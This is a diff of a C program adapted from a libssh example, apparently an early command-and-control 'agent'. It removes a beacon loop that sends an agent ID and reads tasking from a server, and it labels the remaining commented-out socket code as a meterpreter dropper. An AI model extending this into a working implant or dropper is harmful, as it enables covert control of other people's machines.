@@ -15,12 +15,7 @@ The goal is to show the API in action. It's not a reference on how terminal
 clients must be made or how a client should react.
  */
 
-#include <libssh/libssh.h>
-#include "examples_common.h"
-#include <stdio.h>
-#include <errno.h>
-#include <stdlib.h>
-#include <string.h>
+#include "agent.h"
 
 #ifdef _WIN32
 #define strncasecmp _strnicmp
@@ -145,10 +140,7 @@ void remchar(char *, char, char *);
 int authenticate_kbdint(ssh_session, const char *);
 int verify_knownhost(ssh_session);
 int authenticate_console(ssh_session);
-static void error(ssh_session);
 ssh_session connect_ssh(const char *, const char *,int);
-
-char *GLOB_ID = "TEST_AGENT";
 
 void remchar(char *msg, char rem, char *buff){
     int size;
@@ -233,6 +225,7 @@ int verify_knownhost(ssh_session session){
 }
 
 int authenticate_console(ssh_session session){
+	/*Do authentication through terminal. Trying to get rid of this :)*/
   	int rc;
   	int method;
   	char password[128] = {0};
@@ -241,7 +234,7 @@ int authenticate_console(ssh_session session){
   	// Try to authenticate
   	rc = ssh_userauth_none(session, NULL);
   	if (rc == SSH_AUTH_ERROR) {
-    	error(session);
+    	fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));;
     	return rc;
   	}
 
@@ -251,7 +244,7 @@ int authenticate_console(ssh_session session){
     	if (method & SSH_AUTH_METHOD_PUBLICKEY) {
       		rc = ssh_userauth_autopubkey(session, NULL);
       		if (rc == SSH_AUTH_ERROR) {
-      			error(session);
+      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
         		return rc;
       		} else if (rc == SSH_AUTH_SUCCESS) {
         		break;
@@ -262,7 +255,7 @@ int authenticate_console(ssh_session session){
     	if (method & SSH_AUTH_METHOD_INTERACTIVE) {
       		rc = authenticate_kbdint(session, NULL);
       		if (rc == SSH_AUTH_ERROR) {
-      			error(session);
+      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
         		return rc;
       		} else if (rc == SSH_AUTH_SUCCESS) {
         		break;
@@ -277,7 +270,7 @@ int authenticate_console(ssh_session session){
     	if (method & SSH_AUTH_METHOD_PASSWORD) {
       		rc = ssh_userauth_password(session, NULL, password);
       		if (rc == SSH_AUTH_ERROR) {
-      			error(session);
+      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
         		return rc;
       		} else if (rc == SSH_AUTH_SUCCESS) {
         		break;
@@ -367,42 +360,45 @@ int authenticate_kbdint(ssh_session session, const char *password) {
     return err;
 }
 
-static void error(ssh_session session){
-	fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
-}
 
 ssh_session connect_ssh(const char *host, const char *user,int verbosity){
+	/*Connect to server*/
     ssh_session session;
     int auth=0;
 
+	// initialize ssh session structure
     session=ssh_new();
     if (session == NULL) {
         return NULL;
     }
 
-	int port = 1337;
-
-	//int ret = ssh_options_set(session, SSH_OPTIONS_PORT, &port);
-    if(user != NULL){
+	// check and set username
+	if(user != NULL){
         if (ssh_options_set(session, SSH_OPTIONS_USER, user) < 0) {
         	ssh_disconnect(session);
             return NULL;
         }
     }
 
+	// set target host
     if (ssh_options_set(session, SSH_OPTIONS_HOST, host) < 0) {
         return NULL;
     }
     ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
+
+	// do the connection
     if(ssh_connect(session)){
         fprintf(stderr,"[-] Connection failed : %s\n",ssh_get_error(session));
         ssh_disconnect(session);
         return NULL;
     }
+
     if(verify_knownhost(session)<0){
         ssh_disconnect(session);
         return NULL;
     }
+
+	// get password
     auth=authenticate_console(session);
     if(auth==SSH_AUTH_SUCCESS){
         return session;
@@ -413,89 +409,6 @@ ssh_session connect_ssh(const char *host, const char *user,int verbosity){
     }
     ssh_disconnect(session);
     return NULL;
-}
-
-int parse_tasking(char *tasking, ssh_channel chan){
-	if(!strcmp(tasking, "NULL :)")){
-		printf("No tasking available. Quitting...\n");
-		ssh_channel_write(chan, "\0", 2);
-		return 1;
-	}
-	return 0;
-}
-
-
-int func_loop(ssh_session session)
-{
-	// Initialize vars
-  	ssh_channel channel;
-  	int rc;
-  	char tasking[2048];
-  	int nbytes;
-	int quitting = 0;
-  	channel = ssh_channel_new(session);
-
-	printf("[+] Created new SSH channel\n");
-  	if (channel == NULL)
-    	return SSH_ERROR;
-
-	// Open channel
-  	rc = ssh_channel_open_session(channel);
-	printf("[+] Opened SSH Channel with remote server\n");
-  	if (rc != SSH_OK)
-  	{
-    	ssh_channel_free(channel);
-    	return rc;
-  	}
-
-	// Request a shell interface
-  	rc = ssh_channel_request_shell(channel);
-	
-	printf("[ ] Sent request for shell\n");
-  	if (rc != SSH_OK)
-  	{
-    	ssh_channel_close(channel);
-    	ssh_channel_free(channel);
-    	return rc;
-  	}
-	printf("[+] Made it through check\n");
-
-	// Begin the meat of the stuff
-
-
-	// Send the global ID
-	rc = ssh_channel_write(channel, GLOB_ID, strlen(GLOB_ID));
-
-	printf("Wrote ID to channel\n");
-		
-	if (rc == SSH_ERROR){
-		printf("caught ssh error: %s\n", ssh_get_error(channel));
-		ssh_channel_close(channel);
-    	ssh_channel_free(channel);
-    	return rc;
-	}
-
-	while (!quitting)
-	{
-		printf("Top of the line again!\n");
-		nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
-		printf("read %d bytes from channel\n", nbytes);
-		if (nbytes < 0){
-			printf("Caught read error from server...\n");
-    		ssh_channel_close(channel);
-    		ssh_channel_free(channel);
-    		return SSH_ERROR;
-		}		
-
-		printf("Read data: %s\n", tasking);
-		quitting = parse_tasking(tasking, channel);
-	}
-	
-  	
-  	ssh_channel_send_eof(channel);
-  	ssh_channel_close(channel);
-  	ssh_channel_free(channel);
-  	return SSH_OK;
 }
 
 int direct_forwarding(ssh_session session)
@@ -559,6 +472,8 @@ int main(int argc, char* argv[]){
 }
 
 /*
+The bellow are the functions used by meterpreter dropper
+
 void init_socket() {
     WORD word_ex = MAKEWORD((2, 2); 
     WSADATA data;
